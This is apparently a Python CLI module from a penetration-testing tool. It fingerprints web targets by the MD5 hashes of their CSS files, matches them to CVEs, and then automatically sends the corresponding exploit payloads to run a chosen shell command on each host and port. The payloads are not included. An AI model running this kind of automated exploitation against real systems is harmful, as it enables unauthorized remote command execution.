# -*- coding: utf-8 -*-
"""Auto command - 自动化渗透测试"""

import os
import sys
import argparse
from . import BaseCommand


class AutoCommand(BaseCommand):
    """自动化渗透测试命令（指纹识别 + 自动执行Payload）"""

    def add_arguments(self, parser: argparse.ArgumentParser) -> None:
        """添加auto命令的参数"""
        parser.add_argument('url', help='目标URL或IP（如: http://192.168.1.1:80/ 或 192.168.1.1）')
        parser.add_argument('--cmd', default='id', help='要执行的命令（默认: id）')
        parser.add_argument('--timeout', type=float, default=3.0, help='超时时间（秒，默认3.0）')
        parser.add_argument('--ports', help='要测试的端口列表（逗号分隔，如: 80,8080 或 82,83）')
        parser.add_argument('--range', help='端口范围（如: 1-100）')

    def execute(self, args: argparse.Namespace) -> int:
        """执行auto命令"""
        try:
            # 导入必要的模块
            sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))))
            from src.core.fingerprint import get_css_files_md5_from_page
            from src.core.payload_sender import PayloadManager

            url = args.url
            cmd = args.cmd
            timeout = args.timeout

            # 解析端口列表
            ports = None
            if args.ports:
                ports = [int(p.strip()) for p in args.ports.split(',')]
            elif args.range:
                start, end = map(int, args.range.split('-'))
                ports = list(range(start, end + 1))

            # 构建目标 URL 列表
            from urllib.parse import urlparse
            targets = []

            if ports:
                # 如果指定了端口，为每个端口创建 URL
                parsed = urlparse(url)
                scheme = parsed.scheme or 'http'
                host = parsed.hostname or url  # 如果没有 scheme，直接当作 host
                if not parsed.hostname:
                    # url 是纯 IP 或域名
                    host = url
                    scheme = 'http'

                for port in ports:
                    target_url = f"{scheme}://{host}:{port}/"
                    targets.append((host, port, target_url))

                print(f"\n{'='*60}", flush=True)
                print("自动化渗透测试（多端口）", flush=True)
                print(f"{'='*60}", flush=True)
                print(f"目标主机: {host}", flush=True)
                print(f"测试端口: {ports}", flush=True)
                print(f"执行命令: {cmd}", flush=True)
                print(f"{'='*60}\n", flush=True)
            else:
                # 单目标
                targets = [(url, None, url)]

                print(f"\n{'='*60}", flush=True)
                print("自动化渗透测试", flush=True)
                print(f"{'='*60}", flush=True)
                print(f"目标 URL: {url}", flush=True)
                print(f"执行命令: {cmd}", flush=True)
                print(f"{'='*60}\n", flush=True)

            # 对每个目标执行测试
            total_success = 0
            total_tested = 0

            for host, port, target_url in targets:
                port_info = f":{port}" if port else ""
                print(f"\n{'='*60}", flush=True)
                print(f"[*] 测试目标: {host}{port_info}", flush=True)
                print(f"{'='*60}", flush=True)

                # 步骤1: 指纹识别
                print("[*] 步骤1: 正在进行指纹识别...", flush=True)
                css_md5_dict = get_css_files_md5_from_page(target_url, timeout)

                if not css_md5_dict:
                    print(f"[!] {host}{port_info}: 未找到CSS文件或指纹识别失败", flush=True)
                    continue

                # 收集匹配的CVE
                matched_cves = set()
                for css_url, info in css_md5_dict.items():
                    if isinstance(info, tuple):
                        md5_hash, cve_id = info
                        if cve_id:
                            matched_cves.add(cve_id)

                if not matched_cves:
                    print(f"[!] {host}{port_info}: 未匹配到任何CVE", flush=True)
                    continue

                print(f"[+] {host}{port_info}: 匹配到 {len(matched_cves)} 个CVE: {', '.join(matched_cves)}", flush=True)

                # 步骤2: 自动执行Payload
                print(f"\n[*] 步骤2: 正在自动执行Payload...", flush=True)
                manager = PayloadManager(debug=False)

                ip_port = f"{host}:{port}" if port else host

                for cve_id in matched_cves:
                    total_tested += 1
                    print(f"\n[*] 尝试执行 {cve_id}...", flush=True)
                    result = manager.send_payload_safe(cve_id, ip_port, cmd, timeout=10)
                    if result:
                        total_success += 1
                        print(f"[+] {cve_id} 在 {ip_port} 执行成功!", flush=True)

            print(f"\n{'='*60}", flush=True)
            print(f"自动化测试完成: 成功 {total_success}/{total_tested}", flush=True)
            print(f"{'='*60}\n", flush=True)

            return 0 if total_success > 0 else 1

        except Exception as e:
            print(f"[!] 错误: {e}", file=sys.stderr, flush=True)
            import traceback
            traceback.print_exc()
            return 1
